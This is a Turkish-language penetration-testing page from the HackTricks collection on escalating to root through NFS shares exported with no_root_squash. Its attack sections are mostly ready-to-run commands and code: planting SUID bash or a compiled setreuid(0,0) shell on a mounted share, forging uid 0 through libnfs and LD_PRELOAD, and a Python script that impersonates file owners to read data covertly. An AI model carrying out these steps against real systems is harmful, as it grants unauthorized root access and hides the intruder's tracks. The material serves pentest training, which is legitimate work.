# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing Temel Bilgiler

NFS genellikle (özellikle Linux'ta), bağlanan client tarafından dosyalara erişmek için belirtilen `uid` ve `gid` değerlerine güvenir (Kerberos kullanılmıyorsa). Ancak, server üzerinde bu **davranışı değiştirmek** için ayarlanabilecek bazı yapılandırmalar vardır:

- **`all_squash`**: Her kullanıcı ve grubu **`nobody`** (65534 unsigned / -2 signed) ile eşleyerek tüm erişimleri squash eder. Bu nedenle herkes `nobody` olur ve hiçbir kullanıcı kullanılmaz.
- **`root_squash`/`no_all_squash`**: Linux'ta varsayılan davranıştır ve **yalnızca uid 0 (root) ile yapılan erişimleri squash eder**. Bu nedenle herhangi bir `UID` ve `GID` güvenilir kabul edilir, ancak `0` değeri `nobody` ile squash edilir (dolayısıyla root impersonation mümkün değildir).
- **``no_root_squash`**: Bu yapılandırma etkinleştirildiğinde root kullanıcısını bile squash etmez. Bu, bu yapılandırmaya sahip bir directory'yi mount ederseniz ona root olarak erişebileceğiniz anlamına gelir.

**/etc/exports** dosyasında **no_root_squash** olarak yapılandırılmış bir directory bulursanız, bu directory'ye **client olarak erişebilir** ve içine makinenin yerel **root** kullanıcısıymışsınız **gibi yazabilirsiniz**.

**NFS** hakkında daha fazla bilgi için:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Bash kullanarak Option 1:
- Bir client makinesinde **bu directory'yi mount etmek**, ardından **root olarak kopyalayarak** mount edilen folder'ın içine **/bin/bash** binary'sini koymak ve ona **SUID** hakları vermek; daha sonra bu bash binary'sini **victim** makinesinden çalıştırmak.
- NFS share içinde root olmak için server'da **`no_root_squash`** yapılandırılmış olmalıdır.
- Ancak etkin değilse, binary'yi NFS share'e kopyalayıp yükselmek istediğiniz kullanıcı olarak SUID permission'ı vererek başka bir user'a privilege escalation yapabilirsiniz.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2, C ile derlenmiş code kullanarak:
- Bir client makinesinde **bu directory'yi mount etmek**, ardından **root olarak mount edilmiş folder'ın içine**, SUID permission'ını abuse edecek şekilde derlenmiş payload'ımızı kopyalamak, ona **SUID** haklarını vermek ve bu binary'yi **victim** makinesinden **execute etmek** (bazı [C SUID payload'larını](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) burada bulabilirsiniz).
- Öncekiyle aynı kısıtlamalar
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Makinenizden victim machine'e bir **tunnel oluşturabiliyorsanız, gerekli portları tunnelling ederek bu privilege escalation işlemini gerçekleştirmek için Remote version'ı hâlâ kullanabilirsiniz**.\
> Aşağıdaki trick, `/etc/exports` dosyasının **bir IP belirttiği** durum içindir. Bu durumda **remote exploit'i hiçbir şekilde kullanamazsınız** ve **bu trick'i abuse etmeniz** gerekir.\
> Exploit'in çalışması için gereken bir diğer koşul, **`/etc/export` içindeki export'un** **`insecure` flag'ini kullanmasıdır**.\
> --_`/etc/export` bir IP adresi belirtiyorsa bu trick'in çalışıp çalışmayacağından emin değilim_--

### Temel Bilgiler

Senaryo, local machine üzerinde mount edilmiş bir NFS share'ini exploit etmeyi ve client'ın kendi uid/gid değerini belirtmesine izin veren NFSv3 specification'daki bir flaw'dan yararlanmayı içerir; bu da unauthorized access sağlayabilir. Exploitation, NFS RPC call'larını forge etmeye olanak tanıyan [libnfs](https://github.com/sahlberg/libnfs) kütüphanesinin kullanılmasını içerir.<sup>[[1]](#references)</sup>

#### Kütüphaneyi Derleme

Library'nin compilation adımları kernel version'a göre ayarlama gerektirebilir. Bu özel durumda, fallocate syscalls comment out edilmiştir. Compilation process aşağıdaki command'ları içerir:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit'in Gerçekleştirilmesi

Exploit, ayrıcalıkları root seviyesine yükselten ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve ortaya çıkan binary (`a.out`), RPC çağrılarında uid değerini taklit etmek için `ld_nfs.so` kullanılarak suid root ile share üzerine yerleştirilir:

1. **Exploit kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Exploit'i share üzerine koyun ve uid'yi taklit ederek izinlerini değiştirin:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Root privileges elde etmek için exploit'i çalıştırın:**
```bash
/mnt/share/a.out
#root
```
### Bonus: Gizli Dosya Erişimi için NFShell

Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmaktan kaçınmak için) NFS paylaşımıyla etkileşim kurmak amacıyla bir Python script'i (`nfsh.py`) kullanılır. Bu script, uid değerini erişilen dosyanın uid değeriyle eşleşecek şekilde ayarlar ve böylece paylaşım üzerindeki dosyalarla izin sorunları yaşamadan etkileşim kurulmasını sağlar:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Şöyle çalıştırın:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Referanslar

- [1] [Daha az bilinen bir NFS privesc hikayesi](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
